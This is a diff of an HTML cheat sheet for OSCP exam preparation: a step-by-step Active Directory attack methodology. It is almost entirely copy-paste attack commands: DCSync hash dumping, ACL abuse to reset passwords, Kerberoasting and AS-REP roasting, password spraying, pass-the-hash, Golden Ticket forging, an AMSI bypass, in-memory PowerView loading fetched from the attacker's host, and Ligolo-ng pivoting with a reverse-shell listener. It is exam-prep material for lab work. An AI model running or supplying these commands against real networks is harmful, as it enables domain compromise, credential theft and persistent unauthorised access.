+<span class="c"># Verify DCSync rights granted (query 6 in BloodHound should now return results)</span>
+<span class="c"># Then DCSync from kali:</span>
+impacket-secretsdump &lt;domain&gt;/&lt;youruser&gt;:'&lt;pass&gt;'@&lt;DC_IP&gt; -just-dc-ntlm</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">ForceChangePassword — reset without knowing current</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>net rpc password &lt;targetuser&gt; 'NewP@ss123!' -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" -S &lt;DC_IP&gt;
+<span class="c"># Same command as GenericAll on user — both reset the password</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">WriteOwner — take ownership then exploit</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Step 1 — take ownership of the object:</span>
+Set-DomainObjectOwner -Identity &lt;targetobject&gt; -OwnerIdentity &lt;youruser&gt;
+
+<span class="c"># Step 2 — grant yourself GenericAll now that you own it:</span>
+Add-DomainObjectAcl -TargetIdentity &lt;targetobject&gt; \
+  -PrincipalIdentity &lt;youruser&gt; \
+  -Rights All
+
+<span class="c"># Step 3 — exploit GenericAll (reset password, add to group, etc.)</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">PowerView file transfer — load it first</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Method 1 — evil-winrm upload (easiest):</span>
+upload /opt/tools/PowerView.ps1
+Import-Module .\PowerView.ps1
+
+<span class="c"># Method 2 — in-memory from kali HTTP server (best — nothing on disk):</span>
+<span class="c"># On kali:</span>
+python3 -m http.server 8080
+<span class="c"># On victim:</span>
+IEX (New-Object Net.WebClient).DownloadString('http://&lt;KALI&gt;:8080/PowerView.ps1')
+<span class="c"># No Import-Module needed — already loaded in memory</span>
+
+<span class="c"># ALWAYS run Bypass-4MSI first if in evil-winrm:</span>
+menu
+Bypass-4MSI
+<span class="c"># Then load PowerView</span></pre></div>
+
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> BloodHound query 6 returns result (DCSync rights)</span>
+          <span class="sig-cmd">impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;DC_IP&gt; -just-dc-ntlm <span class="sig-note">-- dump entire domain immediately</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> BloodHound shows GenericAll on a user in DA path</span>
+          <span class="sig-cmd">net rpc password &lt;targetuser&gt; 'NewP@ss123!' -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" -S &lt;DC_IP&gt; <span class="sig-note">-- reset their password</span></span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u &lt;targetuser&gt; -p 'NewP@ss123!' <span class="sig-note">-- verify, mark as owned</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> No path visible even after marking all owned accounts</span>
+          <span class="sig-note">-- Run all 7 queries. If still nothing — see Stuck Checklist below.</span>
+        </div>
+      </div>
+    </section>
+
+    <section class="sec" id="stuck">
+      <div class="sec-head"><h2>Stuck Checklist — No Path in BloodHound</h2></div>
+      <div class="note n-bad">If BloodHound shows no path and you've been stuck for 20+ minutes, go through this list top to bottom before moving to another target.</div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">checklist — in order</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># 1. Have you marked EVERY account you own as owned in BloodHound?</span>
+<span class="c">#    Every cracked hash, every account from LSASS, every spray hit</span>
+
+<span class="c"># 2. Re-run all 7 BloodHound queries with each owned account</span>
+
+<span class="c"># 3. Check SYSVOL — 30 seconds, often missed:</span>
+crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -M gpp_password
+
+<span class="c"># 4. Re-run Kerberoasting with every account you have:</span>
+impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt; -request
+
+<span class="c"># 5. Check LDAP descriptions again — new accounts might have creds:</span>
+ldapsearch -x -H ldap://&lt;DC_IP&gt; -D "&lt;user&gt;@&lt;domain&gt;" -w '&lt;pass&gt;' \
+  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description \
+  2&gt;/dev/null | grep -A1 "description:" | grep -iv "built-in\|default"
+
+<span class="c"># 6. Check delegation — often missed:</span>
+impacket-findDelegation &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt;
+
+<span class="c"># 7. Spray new passwords found during enum against all users:</span>
+crackmapexec smb &lt;DC_IP&gt; -u ~/exam/loot/users.txt -p ~/exam/loot/passwords.txt \
+  --continue-on-success --no-bruteforce
+
+<span class="c"># 8. Check readable shares across the whole subnet for interesting files:</span>
+crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' -M spider_plus
+
+<span class="c"># 9. Re-ingest BloodHound with a different/higher-priv account if you have one</span>
+
+<span class="c"># 10. Check if machine is dual-homed — pivot to internal subnet:</span>
+route print
+<span class="c">#     Different subnet = different machines = different LSASS = different creds</span></pre></div>
+
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> After re-ingesting with higher-priv account — new path appears</span>
+          <span class="sig-note">-- Low-priv account didn't have read access to all AD objects. Higher account sees more edges.</span>
+          <span class="sig-cmd">bloodhound-python -u &lt;newuser&gt; -p '&lt;pass&gt;' -d &lt;domain&gt; -dc &lt;DC_IP&gt; -c All --zip <span class="sig-note">-- re-collect, drag new zip into BloodHound</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> spider_plus finds file with credentials on a share</span>
+          <span class="sig-cmd">crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --get-file &lt;remote_path&gt; &lt;local_path&gt; <span class="sig-note">-- download it</span></span>
+          <span class="sig-cmd">grep -i "pass\|user\|cred" &lt;downloaded_file&gt; <span class="sig-note">-- extract creds</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Still nothing after all 10 steps</span>
+          <span class="sig-note">-- Move to another target machine. Come back with fresh eyes. Sometimes a cred from another machine unlocks this one.</span>
+        </div>
+      </div>
+    </section>
+
+    <section class="sec" id="dcsync">
+      <div class="sec-head"><h2>DCSync + Proof</h2></div>
+      <div class="note n-good">You need DA, local admin on DC, or DCSync rights. All three lead here. Proof.txt + whoami + hostname in ONE screenshot is what scores.</div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">get shell on DC</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># With password:</span>
+evil-winrm -i &lt;DC_IP&gt; -u Administrator -p '&lt;pass&gt;'
+impacket-psexec &lt;domain&gt;/Administrator:'&lt;pass&gt;'@&lt;DC_IP&gt;
+
+<span class="c"># With hash (PTH):</span>
+evil-winrm -i &lt;DC_IP&gt; -u Administrator -H &lt;NThash&gt;
+impacket-psexec &lt;domain&gt;/Administrator@&lt;DC_IP&gt; -hashes ':&lt;NThash&gt;'
+
+<span class="c"># With ticket (PTT):</span>
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass dc01.corp.local</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">grab proof — required screenshot</span><div class="cb-tags"><span class="tag t-crit">required</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Run all in same window — screenshot everything:</span>
+whoami
+whoami /all
+hostname
+ipconfig /all
+type C:\Users\Administrator\Desktop\proof.txt
+
+<span class="c"># If proof.txt not on Administrator desktop:</span>
+dir C:\Users\*\Desktop\proof.txt /s
+dir C:\Users\*\Desktop\local.txt /s</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">DCSync — dump all domain hashes</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Full dump — all accounts:</span>
+impacket-secretsdump &lt;domain&gt;/&lt;DA&gt;:'&lt;pass&gt;'@&lt;DC_IP&gt; -just-dc-ntlm
+
+<span class="c"># With hash:</span>
+impacket-secretsdump &lt;domain&gt;/&lt;DA&gt;@&lt;DC_IP&gt; -hashes ':&lt;NThash&gt;' -just-dc-ntlm
+
+<span class="c"># Get krbtgt specifically (for Golden Ticket if needed):</span>
+impacket-secretsdump &lt;domain&gt;/&lt;DA&gt;:'&lt;pass&gt;'@&lt;DC_IP&gt; -just-dc-user krbtgt
+
+<span class="c"># Use any dumped hash to get proof.txt on other machines:</span>
+crackmapexec smb &lt;subnet&gt;/24 -u Administrator -H &lt;NThash&gt; --continue-on-success
+<span class="c"># Every Pwn3d! = another machine with a proof.txt</span></pre></div>
+
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Pwn3d! on DC with any credential</span>
+          <span class="sig-cmd">impacket-secretsdump &lt;domain&gt;/Administrator@&lt;DC_IP&gt; -hashes ':&lt;NThash&gt;' -just-dc-ntlm <span class="sig-note">-- dump everything</span></span>
+          <span class="sig-cmd">evil-winrm -i &lt;DC_IP&gt; -u Administrator -H &lt;NThash&gt; <span class="sig-note">-- shell for proof screenshot</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> DCSync returns krbtgt hash</span>
+          <span class="sig-note">-- Save it. krbtgt hash = Golden Ticket = permanent domain access even after password resets.</span>
+          <span class="sig-cmd">impacket-ticketer -nthash &lt;krbtgt_hash&gt; -domain-sid &lt;SID&gt; -domain &lt;domain&gt; Administrator <span class="sig-note">-- forge Golden Ticket if needed</span></span>
+        </div>
+      </div>
+    </section>
+
+    <section class="sec" id="pivot">
+      <div class="sec-head"><h2>Pivoting — Ligolo-ng</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">full setup</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># KALI — one-time interface setup:</span>
+sudo ip tuntap add user $USER mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+<span class="c"># PIVOT HOST (victim with access to internal net):</span>
+./agent -connect &lt;KALI_IP&gt;:11601 -ignore-cert          <span class="c"># Linux</span>
+.\agent.exe -connect &lt;KALI_IP&gt;:11601 -ignore-cert      <span class="c"># Windows</span>
+
+<span class="c"># In proxy console:</span>
+session   <span class="c"># pick session number</span>
+start     <span class="c"># start tunnel</span>
+
+<span class="c"># Add route on kali:</span>
+sudo ip route add 172.16.1.0/24 dev ligolo
+ping 172.16.1.10   <span class="c"># verify tunnel works</span>
+
+<span class="c"># Expose listener for reverse shells from internal hosts:</span>
+listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444</pre></div>
+    </section>
+
+  </main>
+</div>
+<footer>&lt;DifficultSnow/&gt; | Psalm OSCP Methodology</footer>
+</body></html>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">ingest with given creds</span><div class="cb-tags"><span class="tag t-ad">first action</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
         <pre>bloodhound-python -u &lt;user&gt; -p '&lt;pass&gt;' -d &lt;domain&gt; -ns &lt;DC_IP&gt; -c All --zip -o ~/exam/loot/
 <span class="c"># With hash:</span>
@@ -156,6 +1633,31 @@ crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --pass-pol  <sp
 crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' --shares
 rpcclient -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" &lt;DC_IP&gt; -c "enumdomusers;querydispinfo"
 impacket-GetADUsers -all &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt;</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> --users returns list of domain accounts</span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --users | awk '{print $5}' &gt; users.txt <span class="sig-note">-- extract to users.txt for spray/roasting</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> --pass-pol shows lockoutThreshold: 0 or &gt;5</span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u users.txt -p 'Password123!' --continue-on-success <span class="sig-note">-- safe to spray freely if threshold=0</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> --shares shows readable non-default share</span>
+          <span class="sig-cmd">smbclient //&lt;DC_IP&gt;/&lt;share&gt; -U &lt;domain&gt;/&lt;user&gt;%&lt;pass&gt; <span class="sig-note">-- connect and explore</span></span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -M spider_plus <span class="sig-note">-- spider all readable shares</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> querydispinfo shows description with password</span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;found_pass&gt;' --continue-on-success <span class="sig-note">-- spray found cred everywhere</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">users.txt built, pass-pol checked — move to Kerberoasting immediately</span>
+        <span class="moveon-item">shares all return ACCESS DENIED — nothing readable anonymously or with these creds</span>
+      </div>
     </section>
 
     <section class="sec" id="p2">
@@ -168,6 +1670,29 @@ impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt; -hashes ':&lt;NThash&gt;' -dc-i
 hashcat -m 13100 ~/exam/loot/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force
 hashcat -m 13100 ~/exam/loot/kerberoast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 john --wordlist=/usr/share/wordlists/rockyou.txt ~/exam/loot/kerberoast.hashes</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> $krb5tgs$23$ hash returned for svc_mssql or similar</span>
+          <span class="sig-cmd">hashcat -m 13100 ~/exam/loot/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force <span class="sig-note">-- crack immediately while continuing enum</span></span>
+          <span class="sig-cmd">hashcat -m 13100 ~/exam/loot/kerberoast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force <span class="sig-note">-- run rules if rockyou fails</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Hash cracked — svc_mssql:Password123!</span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u svc_mssql -p 'Password123!' --continue-on-success <span class="sig-note">-- check where this account works</span></span>
+          <span class="sig-cmd">impacket-mssqlclient &lt;domain&gt;/svc_mssql:'Password123!'@&lt;IP&gt; -windows-auth <span class="sig-note">-- if service account, try DB access</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> No SPNs found (0 accounts)</span>
+          <span class="sig-note">-- No kerberoastable accounts. Move to AS-REP roasting immediately.</span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">no SPNs returned — skip to Phase 3</span>
+        <span class="moveon-item">hashes obtained, hashcat running in background — continue to AS-REP roasting in parallel</span>
+        <span class="moveon-item">rockyou + best64 exhausted and hash still not cracked — park it, continue other phases</span>
+      </div>
     </section>
 
     <section class="sec" id="p3">
@@ -179,6 +1704,29 @@ impacket-GetNPUsers &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&
 impacket-GetNPUsers &lt;domain&gt;/ -usersfile ~/exam/loot/users.txt -dc-ip &lt;DC_IP&gt; -no-pass -format hashcat -outputfile ~/exam/loot/asrep.hashes
 
 hashcat -m 18200 ~/exam/loot/asrep.hashes /usr/share/wordlists/rockyou.txt --force</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> $krb5asrep$23$ hash returned</span>
+          <span class="sig-cmd">hashcat -m 18200 ~/exam/loot/asrep.hashes /usr/share/wordlists/rockyou.txt --force <span class="sig-note">-- crack while continuing other work</span></span>
+          <span class="sig-cmd">hashcat -m 18200 ~/exam/loot/asrep.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force <span class="sig-note">-- rules pass if rockyou fails</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Hash cracked — new account with password</span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' --continue-on-success <span class="sig-note">-- sweep with new creds</span></span>
+          <span class="sig-cmd">impacket-GetUserSPNs &lt;domain&gt;/&lt;newuser&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt; -request <span class="sig-note">-- re-run Kerberoast with new account</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> All users have pre-auth required (no hashes)</span>
+          <span class="sig-note">-- No AS-REP roastable accounts. Move to password spray.</span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">no accounts returned — move to Phase 4 spray</span>
+        <span class="moveon-item">hash obtained and hashcat running — continue spray in parallel</span>
+        <span class="moveon-item">rockyou + rules exhausted — park hash, proceed</span>
+      </div>
     </section>
 
     <section class="sec" id="p4">
@@ -194,6 +1742,30 @@ kerbrute passwordspray -d &lt;domain&gt; --dc &lt;DC_IP&gt; ~/exam/loot/users.tx
 kerbrute passwordspray -d &lt;domain&gt; --dc &lt;DC_IP&gt; ~/exam/loot/users.txt 'Summer2024!'
 crackmapexec smb &lt;DC_IP&gt; -u ~/exam/loot/users.txt -p 'Password123!' --continue-on-success
 <span class="c"># "Pwn3d!" in CME output = local admin on that host</span></pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> [+] VALID CREDENTIALS: domain\user:Password123!</span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p 'Password123!' --continue-on-success <span class="sig-note">-- sweep subnet with new creds</span></span>
+          <span class="sig-cmd">impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt;:'Password123!' -dc-ip &lt;DC_IP&gt; -request <span class="sig-note">-- re-run Kerberoast with these creds</span></span>
+          <span class="sig-cmd">bloodhound-python -u &lt;user&gt; -p 'Password123!' -d &lt;domain&gt; -dc &lt;DC_IP&gt; -c All <span class="sig-note">-- re-ingest with new account</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> (Pwn3d!) next to a host in CME output</span>
+          <span class="sig-cmd">impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt; <span class="sig-note">-- dump hashes from that host</span></span>
+          <span class="sig-cmd">evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' <span class="sig-note">-- get interactive shell</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Account locked out during spray</span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --pass-pol <span class="sig-note">-- recheck policy, wait full lockout window before next round</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">3 spray rounds exhausted with seasonal + company name passwords — stop, don't lockout</span>
+        <span class="moveon-item">lockoutThreshold: 1 — do NOT spray at all, only try exact creds you've found elsewhere</span>
+        <span class="moveon-item">valid creds found — stop spraying, pivot to lateral movement immediately</span>
+      </div>
     </section>
 
     <section class="sec" id="p5">
@@ -208,6 +1780,31 @@ crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -H &lt;NThash&gt; --continue-
         <pre>impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt;
 impacket-secretsdump &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; -hashes ':&lt;NThash&gt;'
 impacket-secretsdump -sam sam.bak -system system.bak LOCAL   <span class="c"># offline parse</span></pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> secretsdump returns Administrator:500:aad3...:<NThash>:::</span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u Administrator -H &lt;NThash&gt; --continue-on-success <span class="sig-note">-- sweep hash across subnet</span></span>
+          <span class="sig-cmd">impacket-psexec &lt;domain&gt;/Administrator@&lt;DC_IP&gt; -hashes ':&lt;NThash&gt;' <span class="sig-note">-- try on DC directly</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> psexec/wmiexec lands SYSTEM or DA shell on DC</span>
+          <span class="sig-cmd">whoami /all && hostname && ipconfig /all <span class="sig-note">-- confirm identity + network</span></span>
+          <span class="sig-cmd">type C:\Users\Administrator\Desktop\proof.txt <span class="sig-note">-- grab proof immediately</span></span>
+          <span class="sig-cmd">impacket-secretsdump &lt;domain&gt;/Administrator@&lt;DC_IP&gt; -hashes ':&lt;NThash&gt;' -just-dc-ntlm <span class="sig-note">-- full domain dump</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> PTH fails everywhere — hash doesn't work</span>
+          <span class="sig-cmd">crackmapexec smb &lt;IP&gt; -u Administrator -H &lt;NThash&gt; --local-auth <span class="sig-note">-- try local auth flag</span></span>
+          <span class="sig-note">-- Local admin hashes may not work cross-host if Protected Users or LAPS is active. Need DA hash.</span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">hash swept across subnet — Pwn3d! found on at least one host, escalate from there</span>
+        <span class="moveon-item">no PTH hits — check BloodHound for ACL paths instead (Phase 6)</span>
+        <span class="moveon-item">DA shell obtained — screenshot proof.txt immediately before anything else</span>
+      </div>
     </section>
 
     <section class="sec" id="p6">
